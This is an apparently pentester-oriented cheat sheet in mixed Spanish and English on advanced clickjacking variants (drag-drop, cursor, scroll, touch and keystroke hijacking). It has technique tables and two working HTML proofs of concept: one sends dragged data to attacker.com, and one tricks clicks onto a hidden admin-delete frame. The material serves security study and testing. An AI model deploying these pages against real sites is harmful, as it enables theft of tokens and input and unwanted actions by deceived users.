---
aliases:
  - Drag-Drop Clickjacking
  - Cursor-Jacking
  - Scroll-Jacking
  - Touch-Jacking
tags:
  - type/cheatsheet
  - vuln/clickjacking
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Clickjacking]]'
---
# Clickjacking - Variantes Avanzadas

***

## Drag-and-Drop Clickjacking

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Force user a drag UI element con sensitive data → atacante captures via drop event en iframe | Data exfiltration. |
| `ondragstart` event | Captures dragged content | Standard JS. |
| `ondrop` event | Receives dropped data | Standard. |
| Drag form field | Atacante's iframe captures dragged input value | Direct. |
| Drag link | Captures URL (with token, etc) | Token theft. |
| Drag image | Captures image data URL | Edge. |
| Game-style UX | "Drag the puzzle piece" decoy | Engagement. |
| `setData()` API | Atacante set drag data | Manipulation. |
| `dataTransfer` interface | Read drag data | Standard. |
| Combine con sensitive page | Bank account, password reset, etc | High impact. |
| Multi-step drag | Combine drag + click | Compound. |
| Mobile drag (touch events) | Different API | Mobile-specific. |
| Modern browser limits | Same-origin restrictions on drag | Defense. |
| Persistent capture | Repeat drags exfil multiple data | Bulk. |
^cj-advanced-dragdrop

### Drag-drop PoC

```html
<!DOCTYPE html>
<html>
<head><style>
  iframe { position: absolute; top: 100px; left: 100px; opacity: 0.001; width: 400px; height: 200px; }
  .target { position: absolute; top: 100px; left: 100px; width: 400px; height: 200px; background: #eee; }
</style></head>
<body>
<h1>Drag the gold coin into the chest!</h1>

<div class="target" 
     ondragover="event.preventDefault()" 
     ondrop="captureDrop(event)">
  Drop here
</div>

<iframe src="https://target.com/profile"></iframe>

<script>
function captureDrop(e) {
  e.preventDefault();
  // Atacante extracts dragged data
  const data = e.dataTransfer.getData('text');
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: data
  });
}
</script>
</body>
</html>
```

___

## Cursor-Jacking

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Hide real cursor + show fake cursor offset → user clicks where they think but actually clicks elsewhere | UX deception. |
| `cursor: none` CSS | Hides real cursor | Standard. |
| Custom cursor image | `cursor: url('fake.png'), auto` con offset | Visual fake. |
| Track mousemove + offset | JS tracks real cursor, displays fake at offset | Dynamic. |
| Combine con iframe | Real cursor en iframe, fake elsewhere | Standard. |
| Predictable click target | Atacante knows where user thinks they're clicking | Standard. |
| Combine con animation | Fake cursor smoothly moves | Stealth. |
| Disable cursor en iframe area | User sees no cursor when over target | Disorienting. |
| Multiple decoy elements | Fake UI with many buttons | UX confusion. |
| Combine con audio cues | "Click button on left" → cursor offset right | Multi-modal. |
| Touch device variant | Touch points instead of cursor | Mobile. |
| Browser-specific behaviors | Per-browser cursor handling | Edge. |
| Modern mitigations | Browsers limit cursor manipulation | Defense. |
^cj-advanced-cursorjacking

### Cursor-jacking PoC

```html
<!DOCTYPE html>
<html>
<head><style>
  body { cursor: none; }  /* Hide real cursor */
  .fake-cursor {
    position: fixed;
    width: 24px; height: 24px;
    background: url('https://example.com/cursor.png');
    pointer-events: none;
    z-index: 99999;
  }
  iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; }
  .decoy { position: absolute; top: 200px; left: 200px; }
</style></head>
<body>
<div class="fake-cursor" id="cursor"></div>
<iframe src="https://target.com/admin/delete"></iframe>
<button class="decoy">CLICK FOR FREE PRIZE</button>

<script>
const cursor = document.getElementById('cursor');
document.addEventListener('mousemove', (e) => {
  // Display fake cursor offset 100px from real position
  cursor.style.left = (e.clientX + 100) + 'px';
  cursor.style.top = (e.clientY + 100) + 'px';
  // User sees fake cursor where they want to click,
  // but real cursor (and click) is 100px offset over iframe
});
</script>
</body>
</html>
```

___

## Scroll-Jacking

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Force scroll position to align victim's UI con attacker's decoy | Position manipulation. |
| `scrollTop` JS control | Force iframe scroll position | Standard. |
| Combine con anchor links | `#fragment` jumps to specific point | Edge. |
| Lock scroll en parent | Disable scrolling | UX confusion. |
| Iframe scroll trapping | Capture scroll events | Mobile-specific. |
| Combine con CSS sticky | Sticky elements en frame | Edge. |
| `overflow: hidden` | Hide overflow | Container manipulation. |
| Auto-scroll animation | Smooth scroll → align timing | Stealth. |
| Mobile scroll quirks | Different behavior | Mobile-specific. |
| Combine con click after scroll | Multi-step | Compound. |
^cj-advanced-scrolljacking

___

## Touch-Jacking (Mobile)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Mobile-specific touch event hijacking | Mobile vector. |
| Touch overlay | Touch events captured by overlay | Standard. |
| Tap-jacking | Mobile equivalent to clickjacking | Touch input. |
| Pinch-zoom abuse | Force zoom, displaying overlay | UX. |
| Mobile WebView | App-embedded browsers | App-specific. |
| Mobile-specific gestures | Swipe, pinch, double-tap | Edge. |
| Touch event propagation | Different from mouse | Per-platform. |
| Force orientation change | Trigger reflow | UX. |
| Mobile fullscreen | Different from desktop fullscreen | Edge. |
| Combine con haptic feedback | If browser supports | Stealth. |
| Touch ID / biometric flow | Force touch on legitimate biometric prompt | Edge. |
| Mobile alert dialog overlay | Native dialogs less framing-safe | Edge. |
^cj-advanced-touchjacking

___

## Strokejacking (Keyboard)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Keyboard input redirected to invisible iframe | Keyboard hijack. |
| Focus theft | Force focus on iframe | Standard. |
| `tabindex` manipulation | Adjust tab order | Edge. |
| Capture keystrokes | iframe keystrokes en sensitive form | Direct. |
| Combine con games | Keyboard-driven decoy game | Engagement. |
| Combine con CAPTCHA | User types CAPTCHA, atacante captures | Stealth. |
| Type-jacking | Decoy says "type Y to confirm" → real keystroke goes a iframe | Confirmation. |
| Form field hijack | iframe form receives keystrokes | Data theft. |
| Combine con bidirectional | Type left-to-right vs right-to-left scripts | Edge. |
| Keyboard layout abuse | Different keyboard layouts | Edge. |
| Modern browser focus controls | Mostly mitigated | Defense. |
| Mobile virtual keyboard | Different behavior | Mobile-specific. |
| Combine con autocomplete | Force autofill | Compound. |
^cj-advanced-strokejacking

***
